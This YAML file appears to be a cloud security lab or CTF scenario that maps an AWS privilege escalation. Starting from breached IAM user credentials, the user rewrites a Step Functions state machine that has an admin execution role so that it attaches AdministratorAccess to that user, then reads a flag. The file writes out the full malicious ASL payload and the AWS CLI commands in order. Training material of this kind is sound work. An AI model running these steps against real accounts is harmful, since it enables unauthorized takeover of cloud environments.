attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-stepfunctions-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could have been
        obtained through many real-world vectors: phishing a developer and gaining access to their
        workstation, compromising a browser session, exploiting a vulnerable workload running in
        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
        in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has two Step Functions permissions: states:UpdateStateMachine and
        states:StartExecution on the pre-existing state machine in this account. It also
        holds helpful recon permissions — states:ListStateMachines, states:DescribeStateMachine,
        states:ListExecutions, and states:DescribeExecution — but notably lacks iam:PassRole.

    - id: state-machine
      label: "Admin-Role State Machine"
      type: resource
      subType: sfn-state-machine
      arn: "arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine"
      description: >
        A pre-existing Step Functions Standard state machine with a benign initial definition
        (a single Pass state). The critical detail is its execution role:
        pl-prod-stepfunctions-002-to-admin-statemachine-role holds AdministratorAccess.
        Any principal with states:UpdateStateMachine on this resource can replace the definition
        with attacker-authored ASL and then trigger execution — effectively running arbitrary
        IAM actions as an administrator without ever holding iam:PassRole themselves.

    - id: statemachine-role
      label: "State Machine Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-stepfunctions-002-to-admin-statemachine-role"
      description: >
        The execution role for pl-prod-stepfunctions-002-to-admin-statemachine. It has
        AdministratorAccess attached and trusts states.amazonaws.com. When the malicious
        state machine definition runs, it uses this role to call iam:AttachUserPolicy —
        attaching AdministratorAccess to the starting user. After this execution completes,
        the starting user's existing credentials now carry full administrator permissions.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/stepfunctions-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM String parameter. Retrieving
        it requires ssm:GetParameter on this specific parameter, which is only available to
        principals with AdministratorAccess or an explicit allow. The starting user is denied
        access before escalation; after the state machine execution attaches AdministratorAccess,
        the same starting user credentials can read this parameter directly.

  edges:
    - from: starting-principal
      to: state-machine
      label: "states:UpdateStateMachine"
      description: >
        The starting user replaces the state machine's benign definition with malicious ASL.
        The new definition contains a single Task state using the AWS SDK integration
        (arn:aws:states:::aws-sdk:iam:attachUserPolicy) to attach the AdministratorAccess
        managed policy to the starting user. Because the roleArn is not changed in this
        UpdateStateMachine call, AWS does not require iam:PassRole — the attacker never
        needs the PassRole permission that would normally gate this kind of privilege transfer.
      commands:
        - description: "Build the malicious ASL definition targeting the starting user"
          command: |
            cat > /tmp/malicious-def.json <<'EOF'
            {
              "Comment": "Escalation payload",
              "StartAt": "AttachAdmin",
              "States": {
                "AttachAdmin": {
                  "Type": "Task",
                  "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
                  "Parameters": {
                    "UserName": "pl-prod-stepfunctions-002-to-admin-starting-user",
                    "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
                  },
                  "End": true
                }
              }
            }
            EOF
        - description: "Replace the state machine definition (no iam:PassRole required)"
          command: "aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine --definition file:///tmp/malicious-def.json"
      hints:
        - "The key insight here is that states:UpdateStateMachine only requires iam:PassRole when you also change the roleArn. If you leave the roleArn untouched, you can swap the definition freely — and the execution will still run under the existing admin role."
        - "Build an ASL definition with a single Task state that uses the AWS SDK integration syntax: resource arn:aws:states:::aws-sdk:iam:attachUserPolicy with Parameters containing your UserName and the AdministratorAccess policy ARN. Then call UpdateStateMachine with --definition file://... pointing at your ASL JSON."
        - "Browse to https://pathfinding.cloud/paths/stepfunctions-002 for technique details."

    - from: state-machine
      to: statemachine-role
      label: "states:StartExecution"
      description: >
        The starting user calls states:StartExecution to trigger the malicious definition.
        Step Functions assumes the pre-existing execution role (pl-prod-stepfunctions-002-to-admin-statemachine-role,
        which holds AdministratorAccess) and runs the AttachAdmin task. The IAM SDK integration
        calls iam:AttachUserPolicy on behalf of the execution role, attaching AdministratorAccess
        to the starting user. After the execution completes and IAM propagates (~30 seconds),
        the starting user's existing credentials now carry full admin permissions.
      commands:
        - description: "Start an execution of the malicious state machine"
          command: "aws stepfunctions start-execution --state-machine-arn arn:aws:states:{region}:{account_id}:stateMachine/pl-prod-stepfunctions-002-to-admin-statemachine"
        - description: "Wait for execution to complete and IAM to propagate"
          command: "sleep 30"
        - description: "Confirm the starting user now has AdministratorAccess"
          command: "aws iam list-attached-user-policies --user-name pl-prod-stepfunctions-002-to-admin-starting-user"
      hints: []

    - from: statemachine-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        The state machine execution attached AdministratorAccess to the starting user.
        Using the same starting user credentials (no new keys needed), read the CTF flag
        from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all
        parameters in the account, including this scenario's flag.
      commands:
        - description: "Retrieve the CTF flag using the now-elevated starting user credentials"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/stepfunctions-002-to-admin --query 'Parameter.Value' --output text"
      hints:
        - "You now hold admin-equivalent credentials via the same starting user keys. The flag is stored in AWS Systems Manager Parameter Store under the standard pathfinding-labs flags prefix."
        - "Use ssm:GetParameter with the scenario-specific path to retrieve the flag value."
